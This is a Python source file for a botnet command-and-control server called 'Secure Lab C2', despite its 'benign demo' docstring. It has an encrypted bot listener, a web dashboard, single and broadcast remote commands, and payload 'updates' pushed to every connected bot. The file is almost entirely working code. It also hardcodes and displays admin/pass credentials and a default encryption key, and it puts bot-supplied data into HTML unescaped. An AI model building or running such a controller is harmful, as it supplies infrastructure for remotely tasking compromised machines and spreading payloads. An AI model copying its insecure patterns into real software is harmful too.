#!/usr/bin/env python3
"""Benign local command-relay demo with encrypted bot traffic and a dashboard."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import secrets
import socket
import socketserver
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

KEY = os.environ.get("C2_KEY", "0123456789abcdef0123456789abcdef").encode("utf-8")
if len(KEY) != 32:
    raise ValueError("C2_KEY must be exactly 32 bytes long")

ADMIN_USER = "admin"
ADMIN_PASS = "pass"
BOT_PORT = 5555
WEB_PORT = 8080
SESSION_TTL = 8 * 60 * 60

BOTS: Dict[str, Dict[str, Any]] = {}
JOBS_LOG: List[Dict[str, Any]] = []
UPDATES: List[Dict[str, Any]] = []
SESSIONS: Dict[str, Dict[str, Any]] = {}
BOT_LOCK = threading.Lock()
JOB_LOCK = threading.Lock()
UPDATE_LOCK = threading.Lock()


def encrypt_payload(message: Dict[str, Any]) -> bytes:
    """Encrypt a JSON object with ChaCha20 and prefix a big-endian length."""
    payload = json.dumps(message, separators=(",", ":"), sort_keys=True).encode("utf-8")
    nonce = os.urandom(16)
    cipher = Cipher(algorithms.ChaCha20(KEY, nonce), mode=None)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(payload) + encryptor.finalize()
    encrypted = nonce + ciphertext
    return struct.pack(">I", len(encrypted)) + encrypted


def decrypt_payload(packet: bytes) -> Dict[str, Any]:
    """Decrypt a length-prefixed ChaCha20 payload and parse JSON."""
    if len(packet) < 4:
        raise ValueError("Packet is too short")
    body_len = struct.unpack(">I", packet[:4])[0]
    body = packet[4:4 + body_len]
    if len(body) < 16:
        raise ValueError("Encrypted body is incomplete")
    nonce = body[:16]
    ciphertext = body[16:]
    cipher = Cipher(algorithms.ChaCha20(KEY, nonce), mode=None)
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return json.loads(plaintext.decode("utf-8"))


def recv_exact(sock: socket.socket, size: int) -> bytes:
    """Read exactly size bytes from a socket."""
    chunks = bytearray()
    while len(chunks) < size:
        chunk = sock.recv(size - len(chunks))
        if not chunk:
            raise ConnectionError("Socket closed while reading")
        chunks.extend(chunk)
    return bytes(chunks)


def send_packet(sock: socket.socket, message: Dict[str, Any]) -> None:
    """Send one JSON message over the encrypted transport."""
    sock.sendall(encrypt_payload(message))


def safe_bots_snapshot() -> Dict[str, Dict[str, Any]]:
    """Return sanitized bot data without live socket handles."""
    snap: Dict[str, Dict[str, Any]] = {}
    for bot_id, info in BOTS.items():
        snap[bot_id] = {
            "bot_id": bot_id,
            "addr": info.get("addr"),
            "info": info.get("info", {}),
            "last_seen": info.get("last_seen"),
            "status": info.get("status", "online"),
        }
    return snap


def send_command(bot_id: str, cmd: str, args: Dict[str, Any]) -> Optional[str]:
    """Dispatch a command to a single bot and track the job."""
    with BOT_LOCK:
        bot = BOTS.get(bot_id)
        if not bot:
            return None
        conn = bot.get("conn")
    if conn is None:
        return None
    job_id = hashlib.sha256(f"{bot_id}:{cmd}:{time.time_ns()}".encode("utf-8")).hexdigest()[:12]
    job = {"job_id": job_id, "bot_id": bot_id, "cmd": cmd, "args": args, "ts": time.time(), "result": None}
    with JOB_LOCK:
        JOBS_LOG.append(job)
    send_packet(conn, {"type": "command", "job_id": job_id, "cmd": cmd, "args": args})
    return job_id


def broadcast_command(cmd: str, args: Dict[str, Any]) -> Dict[str, str]:
    """Dispatch the same command to every active bot."""
    results: Dict[str, str] = {}
    for bot_id in list(BOTS.keys()):
        results[bot_id] = send_command(bot_id, cmd, args) or ""
    return results


def push_update(bot_id: str, source_path: str, version: str) -> Optional[Dict[str, Any]]:
    """Queue a benign update payload for a single bot."""
    if not os.path.exists(source_path):
        return None
    with open(source_path, "rb") as fh:
        data = fh.read()
    digest = hashlib.sha256(data).hexdigest()
    payload = {
        "type": "update",
        "version": version,
        "sha256": digest,
        "b64": base64.b64encode(data).decode("ascii"),
    }
    record = {
        "bot_id": bot_id,
        "version": version,
        "sha256": digest,
        "source_path": source_path,
        "ts": time.time(),
        "status": "queued",
    }
    with UPDATE_LOCK:
        UPDATES.append(record)
    with BOT_LOCK:
        bot = BOTS.get(bot_id)
        if not bot:
            return record
        conn = bot.get("conn")
    if conn is not None:
        send_packet(conn, payload)
    return record


def push_update_all(source_path: str, version: str) -> List[Dict[str, Any]]:
    """Queue the same update for every connected bot."""
    records: List[Dict[str, Any]] = []
    for bot_id in list(BOTS.keys()):
        record = push_update(bot_id, source_path, version)
        if record:
            records.append(record)
    return records


def handle_bot_connection(conn: socket.socket, addr: Tuple[str, int]) -> None:
    """Handle a single bot connection and its encrypted traffic."""
    bot_id: Optional[str] = None
    try:
        while True:
            header = recv_exact(conn, 4)
            if not header:
                break
            body_len = struct.unpack(">I", header)[0]
            payload = recv_exact(conn, body_len)
            message = decrypt_payload(header + payload)
            kind = message.get("type")
            if kind == "hello":
                bot_id = str(message.get("bot_id"))
                info = message.get("info", {})
                with BOT_LOCK:
                    BOTS[bot_id] = {
                        "bot_id": bot_id,
                        "addr": addr,
                        "info": info,
                        "last_seen": time.time(),
                        "status": "online",
                        "conn": conn,
                    }
                send_packet(conn, {"type": "welcome", "bot_id": bot_id, "server_time": time.time()})
            elif kind == "heartbeat":
                if bot_id is None:
                    bot_id = str(message.get("bot_id"))
                with BOT_LOCK:
                    bot = BOTS.get(bot_id)
                    if bot:
                        bot["last_seen"] = time.time()
                        bot["status"] = "online"
            elif kind == "job_result":
                job_id = message.get("job_id")
                with JOB_LOCK:
                    for item in JOBS_LOG:
                        if item.get("job_id") == job_id:
                            item["result"] = message.get("result")
                            item["status"] = message.get("status", "ok")
                            item["completed_ts"] = time.time()
                            break
            elif kind == "update_ack":
                bot_id = str(message.get("bot_id") or bot_id or "unknown")
                with UPDATE_LOCK:
                    for item in UPDATES:
                        if item.get("bot_id") == bot_id and item.get("status") == "queued":
                            item["status"] = message.get("status", "received")
                            break
            elif kind == "ping":
                send_packet(conn, {"type": "pong", "ts": time.time()})
    except (ConnectionError, OSError, ValueError, json.JSONDecodeError):
        pass
    finally:
        if bot_id:
            with BOT_LOCK:
                BOTS.pop(bot_id, None)
        try:
            conn.close()
        except OSError:
            pass


class BotListener(socketserver.ThreadingTCPServer):
    """TCP listener for encrypted bot traffic."""
    allow_reuse_address = True

    def __init__(self, server_address: Tuple[str, int]):
        super().__init__(server_address, socketserver.BaseRequestHandler)
        self.daemon_threads = True

    def handle_request(self):
        while True:
            conn, addr = self.socket.accept()
            threading.Thread(target=handle_bot_connection, args=(conn, addr), daemon=True).start()


def run_bot_listener(host: str = "0.0.0.0", port: int = BOT_PORT) -> None:
    """Start the bot TCP listener."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(128)
        while True:
            conn, addr = sock.accept()
            threading.Thread(target=handle_bot_connection, args=(conn, addr), daemon=True).start()


def parse_cookie_header(raw: str) -> Dict[str, str]:
    """Parse cookie values from a request header."""
    cookies: Dict[str, str] = {}
    if not raw:
        return cookies
    for part in raw.split(";"):
        if "=" in part:
            key, value = part.strip().split("=", 1)
            cookies[key] = value
    return cookies


def render_page(title: str, body: str) -> bytes:
    """Return a dashboard page with the requested content."""
    html = f"""
    <!DOCTYPE html>
    <html lang=\"en\">
    <head>
        <meta charset=\"utf-8\">
        <title>{title}</title>
        <style>
            :root {{
                --bg: #0a0a0c;
                --panel: #141418;
                --panel-2: #1b1b20;
                --line: #1e1e22;
                --accent: #7ee0a0;
                --text: #f3f7f5;
                --muted: #aeb7b2;
                --ok: #7ee0a0;
                --warn: #ffcc44;
                --err: #ff6b6b;
            }}
            * {{ box-sizing: border-box; }}
            body {{
                margin: 0; font-family: ui-monospace, Consolas, monospace; background: var(--bg); color: var(--text);
                min-height: 100vh;
            }}
            .topbar {{
                display: flex; justify-content: space-between; align-items: center; padding: 16px 28px; background: var(--panel); border-bottom: 1px solid var(--line);
            }}
            .nav {{ display: flex; gap: 12px; flex-wrap: wrap; }}
            .nav a {{
                color: var(--muted); text-decoration: none; padding: 8px 12px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel-2);
            }}
            .nav a.active {{ background: rgba(126, 224, 160, 0.12); color: var(--text); border-color: rgba(126, 224, 160, 0.4); }}
            .btn {{
                background: var(--panel-2); color: var(--text); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px; cursor: pointer; font: inherit;
            }}
            .btn:hover {{ background: var(--accent); color: #0a0a0c; }}
            .grid {{ display: grid; gap: 18px; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); padding: 24px; }}
            .card {{
                background: var(--panel); border: 1px solid var(--line); border-radius: 14px; padding: 18px; box-shadow: 0 0 0 1px rgba(126,224,160,0.04);
            }}
            .muted {{ color: var(--muted); }}
            .status-ok {{ color: var(--ok); }}
            .status-warn {{ color: var(--warn); }}
            .status-err {{ color: var(--err); }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ border-bottom: 1px solid var(--line); padding: 10px 8px; text-align: left; }}
            input, select, textarea {{
                width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--line); background: var(--panel-2); color: var(--text); font: inherit; margin-top: 8px;
            }}
            form {{ display: grid; gap: 12px; }}
            .login-box {{ max-width: 420px; margin: 80px auto; background: var(--panel); border: 1px solid var(--line); border-radius: 16px; padding: 24px; }}
            .small {{ font-size: 12px; color: var(--muted); }}
        </style>
    </head>
    <body>
        <div class=\"topbar\">
            <strong>Secure Lab C2</strong>
            <div class=\"nav\">
                <a href=\"/dashboard\" class=\"{('active' if title == 'Dashboard' else '')}\">Dashboard</a>
                <a href=\"/bots\" class=\"{('active' if title == 'Bots' else '')}\">Bots</a>
                <a href=\"/terminal\" class=\"{('active' if title == 'Terminal' else '')}\">Terminal</a>
                <a href=\"/jobs\" class=\"{('active' if title == 'Jobs' else '')}\">Jobs</a>
                <a href=\"/updates\" class=\"{('active' if title == 'Updates' else '')}\">Updates</a>
                <a href=\"/settings\" class=\"{('active' if title == 'Settings' else '')}\">Settings</a>
                <a href=\"/logout\">Logout</a>
            </div>
        </div>
        {body}
    </body>
    </html>
    """
    return html.encode("utf-8")


class DashboardHandler(BaseHTTPRequestHandler):
    """Serve the browser dashboard and secure API endpoints."""
    server_version = "SecureLabC2/1.0"

    def log_message(self, fmt: str, *args: Any) -> None:
        return

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        if path == "/login":
            self._render_login()
            return
        if path == "/logout":
            self._logout_and_redirect()
            return
        if not self._valid_session():
            self._redirect("/login")
            return
        if path == "/dashboard":
            self._render_dashboard()
        elif path == "/bots":
            self._render_bots()
        elif path == "/terminal":
            self._render_terminal()
        elif path == "/jobs":
            self._render_jobs()
        elif path == "/updates":
            self._render_updates()
        elif path == "/settings":
            self._render_settings()
        elif path == "/api/bots":
            self._json_response(safe_bots_snapshot())
        elif path == "/api/jobs":
            self._api_jobs(parsed.query)
        elif path == "/api/updates":
            self._json_response({"updates": UPDATES})
        else:
            self._redirect("/dashboard")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        if path == "/login":
            self._handle_login()
            return
        if not self._valid_session():
            self._json_response({"error": "session_required"}, status=401)
            return
        if path == "/api/cmd":
            self._api_cmd()
        elif path == "/api/update":
            self._api_update()
        elif path == "/api/update_all":
            self._api_update_all()
        else:
            self._json_response({"error": "not_found"}, status=404)

    def _read_json(self) -> Dict[str, Any]:
        length = int(self.headers.get("Content-Length", "0"))
        raw = self.rfile.read(length) if length else b"{}"
        if not raw:
            return {}
        try:
            return json.loads(raw.decode("utf-8"))
        except json.JSONDecodeError:
            return {}

    def _json_response(self, payload: Dict[str, Any], status: int = 200) -> None:
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _redirect(self, location: str) -> None:
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    def _valid_session(self) -> bool:
        sid = parse_cookie_header(self.headers.get("Cookie", "")).get("sid")
        if not sid or sid not in SESSIONS:
            return False
        session = SESSIONS[sid]
        if time.time() - session["last"] > SESSION_TTL:
            SESSIONS.pop(sid, None)
            return False
        session["last"] = time.time()
        return True

    def _issue_session(self, username: str) -> str:
        token = secrets.token_urlsafe(32)
        SESSIONS[token] = {"user": username, "created": time.time(), "last": time.time()}
        return token

    def _render_login(self) -> None:
        html = """
        <div class="login-box">
            <h2>Login</h2>
            <form method="post" action="/login">
                <div>
                    <label>Username</label>
                    <input type="text" name="username" value="admin" required>
                </div>
                <div>
                    <label>Password</label>
                    <input type="password" name="password" value="pass" required>
                </div>
                <button class="btn" type="submit">Login</button>
            </form>
        </div>
        """
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(render_page("Login", html))))
        self.end_headers()
        self.wfile.write(render_page("Login", html))

    def _handle_login(self) -> None:
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length) if length else b""
        params = parse_qs(body.decode("utf-8"))
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        if username == ADMIN_USER and password == ADMIN_PASS:
            sid = self._issue_session(username)
            self.send_response(302)
            self.send_header("Set-Cookie", f"sid={sid}; HttpOnly; Path=/; Max-Age={SESSION_TTL}; SameSite=Lax")
            self.send_header("Location", "/dashboard")
            self.end_headers()
            return
        self.send_response(401)
        self.end_headers()
        self.wfile.write(b"invalid credentials")

    def _logout_and_redirect(self) -> None:
        sid = parse_cookie_header(self.headers.get("Cookie", "")).get("sid")
        if sid:
            SESSIONS.pop(sid, None)
        self.send_response(302)
        self.send_header("Set-Cookie", "sid=; HttpOnly; Path=/; Max-Age=0")
        self.send_header("Location", "/login")
        self.end_headers()

    def _render_dashboard(self) -> None:
        total_bots = len(BOTS)
        total_jobs = len(JOBS_LOG)
        total_versions = len({item.get("version") for item in UPDATES if item.get("version")})
        body = f"""
        <div class=\"grid\">
            <div class=\"card\"><div class=\"muted\">Bots</div><h2>{total_bots}</h2></div>
            <div class=\"card\"><div class=\"muted\">Jobs</div><h2>{total_jobs}</h2></div>
            <div class=\"card\"><div class=\"muted\">Versions</div><h2>{total_versions}</h2></div>
        </div>
        <div class=\"card\" style=\"margin: 0 24px 24px 24px;\">
            <h3>Recent activity</h3>
            <table>
                <tr><th>Time</th><th>Bot</th><th>Command</th><th>Status</th></tr>
                {''.join(f'<tr><td>{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(job["ts"]))}</td><td>{job["bot_id"]}</td><td>{job["cmd"]}</td><td class="status-ok">{job.get("status", "queued")}</td></tr>' for job in JOBS_LOG[-6:])}
            </table>
        </div>
        """
        self._send_html("Dashboard", body)

    def _render_bots(self) -> None:
        rows = "".join(
            f"<tr><td>{bot_id}</td><td>{info.get('info', {}).get('hostname', 'unknown')}</td><td>{info.get('status', 'online')}</td><td>{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info.get('last_seen', 0)))}</td></tr>"
            for bot_id, info in safe_bots_snapshot().items()
        )
        if not rows:
            rows = '<tr><td colspan="4">No active bots</td></tr>'
        body = f"""
        <div class=\"card\" style=\"margin: 24px;\">
            <h3>Bot inventory</h3>
            <table>
                <tr><th>Bot ID</th><th>Host</th><th>Status</th><th>Last Seen</th></tr>
                {rows}
            </table>
        </div>
        """
        self._send_html("Bots", body)

    def _render_terminal(self) -> None:
        bot_select = "".join(f'<option value="{bot_id}">{bot_id}</option>' for bot_id in BOTS.keys())
        body = f"""
        <div class=\"card\" style=\"margin: 24px;\">
            <h3>Remote command</h3>
            <form id=\"cmdForm\">
                <label>Bot</label>
                <select id=\"botId\">{bot_select or '<option value="">No bots online</option>'}</select>
                <label>Command</label>
                <input id=\"cmd\" value=\"info\" placeholder=\"info\">
                <label>Arguments JSON</label>
                <textarea id=\"args\" rows=\"4\">{{}}</textarea>
                <button class=\"btn\" type=\"submit\">Send</button>
            </form>
            <div class=\"small\" id=\"cmdResult\">Waiting.</div>
        </div>
        <script>
            document.getElementById('cmdForm').onsubmit = async function(e) {{
                e.preventDefault();
                const payload = {{
                    bot_id: document.getElementById('botId').value,
                    cmd: document.getElementById('cmd').value,
                    args: JSON.parse(document.getElementById('args').value || '{{}}')
                }};
                const res = await fetch('/api/cmd', {{ method: 'POST', headers: {{ 'Content-Type': 'application/json' }}, body: JSON.stringify(payload) }});
                const data = await res.json();
                document.getElementById('cmdResult').textContent = JSON.stringify(data, null, 2);
            }};
        </script>
        """
        self._send_html("Terminal", body)

    def _render_jobs(self) -> None:
        table = "".join(
            f"<tr><td>{item['job_id']}</td><td>{item['bot_id']}</td><td>{item['cmd']}</td><td>{item.get('status', 'queued')}</td></tr>"
            for item in JOBS_LOG[-20:]
        )
        body = f"""
        <div class=\"card\" style=\"margin: 24px;\">
            <h3>Job log</h3>
            <table>
                <tr><th>Job ID</th><th>Bot</th><th>Command</th><th>Status</th></tr>
                {table or '<tr><td colspan="4">No jobs</td></tr>'}
            </table>
        </div>
        """
        self._send_html("Jobs", body)

    def _render_updates(self) -> None:
        form = """
        <div class=\"card\" style=\"margin: 24px;\">
            <h3>Queue update</h3>
            <form method=\"post\" action=\"/api/update\">
                <label>Bot ID</label>
                <input name=\"bot_id\" placeholder=\"bot-1\">
                <label>Path</label>
                <input name=\"path\" placeholder=\"/tmp/update.zip\">
                <label>Version</label>
                <input name=\"version\" placeholder=\"1.0.1\">
                <button class=\"btn\" type=\"submit\">Send update</button>
            </form>
        </div>
        """
        updates = "".join(
            f"<tr><td>{record['bot_id']}</td><td>{record['version']}</td><td>{record['status']}</td><td>{record['sha256'][:12]}</td></tr>"
            for record in UPDATES[-10:]
        )
        body = f"{form}<div class=\"card\" style=\"margin: 24px;\"><h3>Update queue</h3><table><tr><th>Bot</th><th>Version</th><th>Status</th><th>Hash</th></tr>{updates or '<tr><td colspan=\"4\">No updates queued</td></tr>'}</table></div>"
        self._send_html("Updates", body)

    def _render_settings(self) -> None:
        body = """
        <div class=\"card\" style=\"margin: 24px;\">
            <h3>Server settings</h3>
            <p>Host: 0.0.0.0:5555</p>
            <p>Web: http://localhost:8080</p>
            <p>Authentication: admin / pass</p>
            <form method=\"get\" action=\"/logout\"><button class=\"btn\" type=\"submit\">Logout all</button></form>
        </div>
        """
        self._send_html("Settings", body)

    def _api_jobs(self, query: str) -> None:
        params = parse_qs(query)
        bot_id = params.get("bot_id", [None])[0]
        limit = int(params.get("limit", ["20"])[0])
        records = JOBS_LOG
        if bot_id:
            records = [item for item in records if item.get("bot_id") == bot_id]
        records = records[-limit:]
        self._json_response({"jobs": records})

    def _api_cmd(self) -> None:
        data = self._read_json()
        bot_id = data.get("bot_id")
        cmd = data.get("cmd")
        args = data.get("args", {}) or {}
        if cmd is None:
            self._json_response({"error": "missing command"}, status=400)
            return
        if bot_id:
            job_id = send_command(bot_id, cmd, args)
            self._json_response({"status": "queued", "job_id": job_id})
        else:
            self._json_response({"status": "broadcasted", "jobs": broadcast_command(cmd, args)})

    def _api_update(self) -> None:
        data = self._read_json()
        bot_id = data.get("bot_id")
        path = data.get("path")
        version = data.get("version", "unknown")
        if not path or not bot_id:
            self._json_response({"error": "bot_id and path required"}, status=400)
            return
        record = push_update(bot_id, path, version)
        self._json_response({"status": "queued", "record": record})

    def _api_update_all(self) -> None:
        data = self._read_json()
        path = data.get("path")
        version = data.get("version", "unknown")
        if not path:
            self._json_response({"error": "path required"}, status=400)
            return
        records = push_update_all(path, version)
        self._json_response({"status": "queued", "records": records})

    def _send_html(self, title: str, body: str) -> None:
        page = render_page(title, body)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.end_headers()
        self.wfile.write(page)


def start_web_server(host: str = "0.0.0.0", port: int = WEB_PORT) -> None:
    """Start the dashboard and API server."""
    httpd = ThreadingHTTPServer((host, port), DashboardHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    threading.Thread(target=start_web_server, args=("0.0.0.0", WEB_PORT), daemon=True).start()
    print(f"[server] bot listener on 0.0.0.0:{BOT_PORT}")
    print(f"[server] dashboard on http://localhost:{WEB_PORT}/login")
    run_bot_listener("0.0.0.0", BOT_PORT)
